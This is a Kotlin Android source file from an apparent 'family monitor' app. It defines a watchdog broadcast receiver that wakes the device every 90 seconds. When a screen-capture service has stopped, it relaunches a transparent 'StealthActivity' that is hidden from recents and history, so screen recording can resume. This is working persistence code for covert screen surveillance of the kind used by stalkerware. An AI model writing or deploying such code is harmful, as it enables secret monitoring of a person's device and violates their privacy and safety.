package com.example.family_monitor

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class WatchdogReceiver : BroadcastReceiver() {

    companion object {
        const val ACTION_WATCHDOG = "com.example.family_monitor.ACTION_WATCHDOG"
        private const val REQ     = 7777
        private const val INTERVAL = 90_000L   // 90 s

        fun schedule(context: Context) {
            val am = context.getSystemService(AlarmManager::class.java)
            val pi = pi(context)
            val trigger = System.currentTimeMillis() + INTERVAL
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi)
                else
                    am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi)
            } catch (_: Exception) {
                am.set(AlarmManager.RTC_WAKEUP, trigger, pi)
            }
        }

        private fun pi(ctx: Context) = PendingIntent.getBroadcast(
            ctx, REQ,
            Intent(ctx, WatchdogReceiver::class.java).apply { action = ACTION_WATCHDOG },
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_WATCHDOG) return
        if (ScreenCaptureService.instance == null) {
            // Service is dead — re-acquire projection via transparent Activity
            val i = Intent(context, StealthActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_NO_HISTORY or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            try { context.startActivity(i) } catch (_: Exception) {}
        }
        schedule(context)   // re-arm
    }
}
